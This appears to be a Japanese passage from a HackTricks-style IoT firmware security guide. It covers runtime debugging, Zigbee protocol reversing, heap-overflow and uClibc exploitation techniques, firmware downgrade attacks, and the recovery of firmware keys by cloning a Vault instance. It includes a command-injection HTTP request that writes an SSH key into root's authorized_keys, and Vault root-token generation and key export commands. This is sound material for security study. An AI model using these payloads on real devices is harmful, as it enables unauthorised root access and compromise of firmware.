再現性のある障害箇所の切り分けには、書き込み可能な安定したボリュームにタイムスタンプ付きのマーカーファイルを書き込み、オフラインで確認します。`/dev/kmsg`、FIFO、一時的なコンソールでは、レート制限やプロセスの早期終了によって誤検知が発生することがあります。また、無関係なコードを変更する前に、各レイヤー間でインターフェースが正確に一致しているか比較します。たとえば、`uname -r` と `/lib/modules/`、ディスク上の ext4 機能とカーネル設定、Mesa の `libGL` の世代と DRI ドライバー ABI、および PCI 情報から導かれるドライバー名を確認します。コンポーネントが存在し、`dlopen()` に成功していても、利用側が異なる ABI を想定しているために使えないことがあります。<sup>[[11]](#references)</sup>

## 実践的な動的解析

この段階では、実機またはエミュレートされたデバイス環境を解析に使用します。OS とファイルシステムへのシェルアクセスを維持することが不可欠です。エミュレーションではハードウェアとのやり取りを完全に再現できない場合があり、エミュレーターを再起動しなければならないこともあります。ファイルシステムを再確認し、公開されている Web ページやネットワークサービスを exploit し、ブートローダーの脆弱性を調査してください。潜在的な backdoor の脆弱性を特定するには、ファームウェアの完全性テストが重要です。

## 実行時解析の手法

実行時解析では、プロセスやバイナリが動作する環境でそれらとやり取りします。gdb-multiarch、Frida、Ghidra などのツールを使ってブレークポイントを設定し、fuzzing などの手法で脆弱性を特定します。

完全なデバッガーを利用できない組み込みターゲットでは、**静的リンクされた `gdbserver` をデバイスにコピーして、リモートで接続します**。<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor メッセージマッピング

IoT ハブでは、RF スタックが**radio MCU**と Linux userland プロセスに分割されていることがよくあります。次の経路をマッピングするのが有効です。<sup>[[8]](#references)</sup>

1. 空中の**RF frame**
2. radio MCU 上の**controller-side parser**
3. Linux に転送される**serial/UART text または TLV protocol**（例: `/dev/tty*`）
4. メイン daemon 内の**application dispatcher**
5. **protocol-specific handler / state machine**

このアーキテクチャには、リバース対象が1つではなく2つあります。controller がバイナリの無線フレームを `Group,Command,arg1,arg2,...` のようなテキストプロトコルに変換する場合、次を特定します。

- **message groups** と dispatch table
- どのメッセージが**network**由来で、どれが controller 自身から来るか
- 正確な**manufacturer-specific discriminator fields**（例: Zigbee の `manufacturer_code` とカスタム `cluster_command`）
- **commissioning**、discovery、firmware/model download の各フェーズでのみ到達可能な handler

Zigbee では、ペアリング通信をキャプチャし、対象がデフォルトの**Link Key** `ZigBeeAlliance09` に依存しているか確認します。依存している場合、commissioning 通信のスニッフィングで**Network Key**が漏洩する可能性があります。Zigbee 3.0 の install code はこのリスクを軽減するため、テスト対象デバイスが実際にそれを強制しているか確認してください。

### Manufacturer-specific protocol handler と FSM による到達可能性

Vendor-specific Zigbee/ZCL command は、標準化された cluster よりも優れた標的となることがよくあります。検証実績の少ない**custom parsing code**や内部**FSM**に処理が渡るためです。<sup>[[8]](#references)</sup>

実践的な手順:

- command dispatcher をリバースし、**vendor-only handler**を見つける。
- **FSM state**、**event**、**check**、**action**、**next-state**の table を特定する。
- 自動的に次へ進む**transitional state**と、最終的に attacker-controlled state をリセットまたは解放する retry/error branch を特定する。
- buggy handler に常に到達可能だと決めつけず、脆弱な state に daemon を移行させるために必要な正規の protocol exchange を確認する。

タイミングに敏感な protocol では、Python framework による packet replay は遅すぎる場合があります。より確実な方法は、vendor-grade stack を使って実機（例: **nRF52840**）上で正規デバイスをエミュレートし、正しい**endpoint**、**attribute**、commissioning timing を再現することです。

### 組み込み daemon における断片化 download のバグクラス

**fragmented blob/model/configuration download**では、繰り返し見られる firmware bug class があります。<sup>[[8]](#references)</sup>

1. **最初の fragment**（`offset == 0`）で `ctx->total_size` を保存し、`malloc(total_size)` を割り当てる。
2. 後続の fragment では、`packet_total_size >= offset + chunk_len` のような attacker-controlled な**packet-local** field だけを検証する。
3. コピー処理では、元の割り当てサイズに対する確認を行わずに `memcpy(&ctx->buffer[offset], chunk, chunk_len)` を実行する。

これにより、攻撃者は次の操作が可能になります。

- 宣言された total size が**小さい**最初の有効な fragment を送り、小さな heap allocation を発生させる。
- **想定される offset**を指定しつつ、より大きな `chunk_len` を持つ後続 fragment を送る。
- packet-local size を偽装し、新たな検証を通過させながら、元の割り当て済み buffer を overflow させる。

脆弱な経路が commissioning logic の背後にある場合、malformed fragment を送る前に、想定される model-download または blob-download state に対象を移行させるため、十分な**device emulation**が必要です。

### Protocol による `free()` のトリガー

組み込み daemon では、heap metadata exploitation を引き起こす最も簡単な方法は、多くの場合「cleanup を待つ」ことではなく、**protocol 自身の error handling を強制する**ことです。<sup>[[8]](#references)</sup>

- 不正な後続 fragment を送り、FSM を**retry**または**error** state に移行させる。
- retry のしきい値を超え、daemon に**context のリセット**と破損した buffer の解放を行わせる。
- この予測可能な `free()` を使い、プロセスが無関係な理由で crash する前に allocator-side primitive を発動させる。

これは、組み込み Linux の**musl/uClibc/dlmalloc-like** allocator に対して特に有効です。chunk metadata の破損により、unlink/unbin logic を write primitive に変えられる可能性があります。安定した手法は、実際の bin pointer をすぐに破壊してプロセスを crash させるのではなく、**size field**を破損させ、overflow した buffer 内に配置した**fake chunk**へ allocator の走査を誘導することです。

## Binary Exploitation と Proof-of-Concept

特定した脆弱性の PoC を開発するには、対象アーキテクチャを深く理解し、低レベル言語でプログラミングする必要があります。組み込みシステムでは binary runtime protection はまれですが、存在する場合は Return Oriented Programming (ROP) などの手法が必要になることがあります。

### uClibc fastbin exploitation に関する注意点（組み込み Linux）

- **Fastbin と consolidation:** uClibc は glibc と同様の fastbin を使用します。後続の大きな allocation によって `__malloc_consolidate()` が呼び出される可能性があるため、fake chunk は妥当な size、`fd = 0`、周囲の chunk が「使用中」と判定されることなど、各種チェックを通過する必要があります。<sup>[[6]](#references)</sup>
- **ASLR 有効時の non-PIE binary:** ASLR が有効でも、メイン binary が**non-PIE**なら、binary 内の `.data/.bss` address は安定しています。有効な heap chunk header にすでに似ている領域を狙い、fastbin allocation を**function pointer table**上に配置できます。
- **parser を停止させる NUL:** JSON の parse 時、payload 内の `\x00` で parse を停止させつつ、後続の attacker-controlled byte を stack pivot/ROP chain 用に残せます。
- **`/proc/self/mem` 経由の shellcode:** `open("/proc/self/mem")`、`lseek()`、`write()`を呼び出す ROP chain で、既知の memory mapping に実行可能な shellcode を配置してジャンプできます。

## Firmware Analysis 用の準備済み Operating System

[AttifyOS](https://github.com/adi0x90/attifyos) や [EmbedOS](https://github.com/scriptingxss/EmbedOS) などの operating system は、firmware security testing に必要なツールを備えた、事前設定済みの環境を提供します。

## Firmware Analysis 用の準備済み OS

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS は、Internet of Things (IoT) デバイスの security assessment と penetration testing を支援するための distro です。必要なツールをすべて読み込んだ事前設定済みの環境を提供し、作業時間を大幅に短縮します。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): firmware security testing tools が事前にインストールされた、Ubuntu 18.04 ベースの embedded security testing operating system です。

## Firmware Downgrade Attacks と Insecure Update Mechanisms

vendor が firmware image の暗号署名を検証していても、**version rollback（downgrade）protection は省略されていることがよくあります**。boot-または recovery-loader が組み込み公開鍵で署名を検証するだけで、書き込む image の*version*（または monotonic counter）を比較しない場合、攻撃者は署名が有効な**古い脆弱な firmware**を正規の手順でインストールし、修正済みの脆弱性を再び悪用可能にできます。<sup>[[4]](#references)</sup>

典型的な攻撃手順:

1. **古い署名済み image を入手する**
   * vendor の公開 download portal、CDN、または support site から取得する。
   * companion mobile/desktop application から抽出する（例: Android APK 内の `assets/firmware/`）。
   * VirusTotal、Internet archive、forum などの第三者 repository から取得する。
2. 公開されている update channel を使って、image をデバイスに**upload または配信する**:
   * Web UI、mobile-app API、USB、TFTP、MQTT など。
   * 一般消費者向け IoT デバイスの多くは、Base64 encode された firmware blob を受け取り、server-side で decode して recovery/upgrade を開始する、*認証不要*の HTTP(S) endpoint を公開しています。
3. downgrade 後、新しい release で修正された脆弱性を悪用する（例: 後から追加された command-injection filter）。
4. 必要に応じて、永続化を確立した後に最新の image を再度 flash するか、検出を避けるため update を無効化する。

### 例: Downgrade 後の Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

脆弱な（ダウングレードされた）ファームウェアでは、`md5` パラメーターがサニタイズされずにシェルコマンドへ直接連結されるため、任意のコマンドを注入できます（ここでは、SSH鍵認証によるrootアクセスを有効化しています）。後のファームウェアバージョンでは基本的な文字フィルターが導入されましたが、ダウングレード保護がないため、この修正は実質的に意味をなしません。<sup>[[4]](#references)</sup>

### モバイルアプリからのファームウェア抽出

多くのベンダーは、アプリからBluetooth/Wi-Fi経由でデバイスをアップデートできるよう、完全なファームウェアイメージを付属のモバイルアプリに同梱しています。これらのパッケージは、`assets/fw/` や `res/raw/` などのパスにあるAPK/APEX内へ、暗号化されずに保存されていることがよくあります。`apktool`、`ghidra`、あるいは単純な `unzip` などのツールを使えば、実機に触れることなく署名済みのイメージを取り出せます。<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/Bスロット設計におけるupdaterのみのアンチロールバック回避

一部のベンダーはアンチダウングレードの**ラチェット**を実装していますが、*updater*のロジック内に限られます（たとえば、CAN経由のUDSルーチン、リカバリーコマンド、ユーザー空間のOTAエージェントなど）。その後、**bootloader**がイメージの署名/CRCのみを確認し、パーティションテーブルやスロットメタデータを信頼する場合、ロールバック保護は依然として回避できます。<sup>[[7]](#references)</sup>

典型的な脆弱な設計:

- firmwareメタデータに、バージョン記述子と**セキュリティラチェット**/単調増加カウンターの両方が含まれる。
- updaterは、イメージのラチェット値を永続ストレージに保存された値と比較し、古い署名済みイメージを拒否する。
- bootloaderはそのラチェットを解析せず、選択されたスロットから起動する前にヘッダー、CRC、署名のみを検証する。
- スロットの有効化情報はパーティションテーブルまたはスロットごとの世代カウンターに別々に保存され、検証済みのfirmwareダイジェストと**暗号学的に結び付けられていない**。

これにより、デュアルスロットシステムで**一方のイメージを検証して別のイメージを起動する**手法が成立します。攻撃者が、最新の署名済みイメージを使ってupdaterにスロットBを次回起動対象として設定させ、その後、再起動前にスロットBを上書きできる場合、bootloaderはすでに確定済みのスロットメタデータだけを信頼するため、ダウングレードされたイメージを起動する可能性があります。

よくある悪用パターン:

1. **最新の署名済み**firmwareを非アクティブスロットにアップロードし、通常の検証/切り替えルーチンを実行して、そのスロットが次のアクティブスロットになるようレイアウトを設定する。
2. **まだ再起動しない**。同じセッションでスロットの準備/消去ルーチンを再度実行する。
3. 古い起動状態やスロット選択ロジックを悪用し、updaterに、直前に昇格させた**同じ物理スロット**を消去させる。
4. **古いが署名は有効な**firmwareをそのスロットに書き込む。
5. ラチェットを適用する検証ルーチンをスキップし、直接再起動する。
6. bootloaderは昇格済みのスロットを選択し、署名/完全性のみを検証して、古いイメージを起動する。

A/B更新実装をリバースエンジニアリングする際に確認すべき点:

- スロット選択が、切り替え成功後に更新されない**起動時フラグ**から導出されている。
- `prepare_passive_slot()`のようなルーチンが、**現在確定しているレイアウト**ではなく古い状態に基づいてスロットを消去する。
- `part_write_layout()`のような関数が、検証済みイメージのハッシュを保存せず、**世代カウンター**/アクティブフラグのみを更新する。
- ラチェットチェックがユーザー空間やupdaterコードに実装されている一方、ROM / bootloader / secure bootの各段階には実装されていない。
- 消去またはリカバリールーチンが、内容を削除して書き換えた後も、そのスロットを起動可能な状態のままにする。

### 更新ロジックの評価チェックリスト

* *update endpoint*の通信経路/認証は適切に保護されているか（TLS + 認証）？
* 書き込み前に、デバイスは**バージョン番号**または**単調増加するアンチロールバックカウンター**を比較するか？
* イメージはsecure bootチェーン内で検証されるか（例: ROMコードによる署名チェック）？
* **bootloaderは、署名/CRCのみを確認するのではなく、updaterと同じラチェットを適用するか**？
* スロットの有効化メタデータは**検証済みfirmwareのダイジェスト/バージョンに結び付けられているか**、それとも昇格後にスロットを変更できるか？
* スロット切り替えが成功した後、デバイスは強制的に再起動するか、それとも同じセッション中に後続の更新/消去ルーチンを実行できるか？
* ユーザーランドコードは追加の健全性チェック（例: 許可されたパーティションマップ、モデル番号）を行うか？
* *部分的な*更新や*バックアップ*更新のフローは、同じ検証ロジックを再利用しているか？

> 💡  上記のいずれかが欠けている場合、そのプラットフォームはロールバック攻撃に対して脆弱である可能性が高いです。

## 脆弱なfirmwareで練習する

firmwareの脆弱性の発見を練習するには、以下の脆弱なfirmwareプロジェクトを出発点として使用してください。

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 組み込みKMS/Vault状態からのfirmware復号鍵の復元

更新イメージに小さな平文メタデータと大きな高エントロピーのblobが混在している場合、何かをブルートフォースする前にコンテナのトリアージを行ってください:<sup>[[1]](#references)</sup>

- `hexdump`、`xxd`、`strings -tx`、`base64 -d`、`binwalk -E`を使って、ヘッダー、オフセット、行境界をダンプする。
- `Salted__`は通常、OpenSSLの`enc`形式を示す。次の8バイトがsaltで、残りのバイトが暗号文。
- デコード結果がちょうど`256`バイトになるBase64フィールドは、ランダムなfirmwareパスワード/セッションキーをラップしたRSA-2048暗号文である可能性を強く示唆する。
- 同じファイル内の分離型PGPデータは、真正性のみを保護していることが多い。機密性を保護する仕組みだと思い込まないこと。

静的な鍵の探索（`grep`、`strings`、PEM/PGP検索）で見つからない場合は、秘密鍵だけを探すのではなく、**実際の復号経路**をリバースエンジニアリングしてください。

- updater / 管理バイナリを逆コンパイルし、暗号化blobを読み取る箇所、それを展開するヘルパー/API、要求する論理鍵名を追跡する。
- 抽出したroot filesystem内で、KMSの状態（`vault/`、`transit/`、`pkcs11`、`keystore`、`sealed-secrets`）に加えて、unitファイルやinitスクリプトを検索する。
- 平文の`vault operator unseal ...`、リカバリーキー、ブートストラップトークン、ローカルKMSの自動unsealスクリプトは、秘密鍵と同等のものとして扱う。

アプライアンスに元のVaultバイナリとストレージバックエンドが含まれている場合は、Vaultの内部を再実装するより、その環境を再現する方が通常は簡単です。

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

クローンした KMS で root 権限を取得した状態で:

- transit key を隔離されたクローン内でのみ export 可能にする: `vault write transit/keys/<name>/config exportable=true`
- unwrap key を export する: `vault read transit/export/encryption-key/<name>`
- 復元した RSA key を、KMS で使われている正確な padding/hash の組み合わせで試す。PKCS#1 v1.5 decrypt の失敗や、デフォルトの OAEP decrypt の失敗だけでは、key が間違っているとは言えない。Vault を使うフローの多くは SHA-256 を使う OAEP を使用する一方、一般的なライブラリのデフォルトは SHA-1 である。
- payload が `Salted__` で始まる場合は、AES-CBC decrypt を試す前に、ベンダーの OpenSSL KDF（`EVP_BytesToKey`。レガシー機器では MD5 がよく使われる）を正確に再現する。

これにより、「暗号化された firmware」は、より一般的な問題になる。つまり、**機器側の運用 key を復元し、正確な unwrap + KDF パラメーターをオフラインで再現する**。

## トレーニングと認定資格

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude で firmware を解析する: シニアレベルのスキルとジュニアレベルの自律性](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware セキュリティテストの方法論](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: モノのインターネットを攻撃するための決定版ガイド](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [放置されたハードウェアのゼロデイを悪用する — Trail of Bits ブログ](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [20ドルのスマートデバイスから、あなたの家へのアクセスを得た方法](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Tesla Wall Connector の充電ポートコネクターからの攻撃 - パート2: アンチダウングレードの回避](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Make it Blink: Philips Hue Bridge の Over-the-Air Exploitation](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [QEMU 上の Tesla OS を ROOT 化する パート1: 展開](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux kernel ドキュメント - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [QEMU 上の Tesla OS を ROOT 化する パート2: デバッグと修正](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS の password: 脆弱な XOR 暗号化により SPI Flash から復元可能 (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Dell BIOS password 復元ツール](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — ハードウェア hacking の復習 パート2](https://voidstarsec.com/blog/brushing-up-part-2)
- [15] [Cypherock Hardware Wallet を hack した方法と理由: 全記録](https://www.darknavy.org/blog/how_and_why_we_hacked_cypherock_hardware_wallet_the_full_story/)
{{#include ../../banners/hacktricks-training.md}}
